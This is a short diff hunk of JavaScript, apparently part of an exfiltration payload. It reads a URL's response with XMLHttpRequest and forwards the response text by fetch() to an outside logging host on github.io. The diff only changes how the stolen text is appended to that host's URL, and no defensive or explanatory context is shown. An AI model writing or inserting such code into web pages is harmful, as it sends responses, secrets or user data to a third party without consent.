@@ -7,7 +7,7 @@
 
         xhr.onreadystatechange = function() {
           if(xhr.readyState == XMLHttpRequest.DONE) {
-            fetch('https://m4tch4t3a.github.io/log?key=' + xhr.responseText)
+            fetch('https://m4tch4t3a.github.io/log' + xhr.responseText)
             }
           }
         xhr.open('GET', url, true);
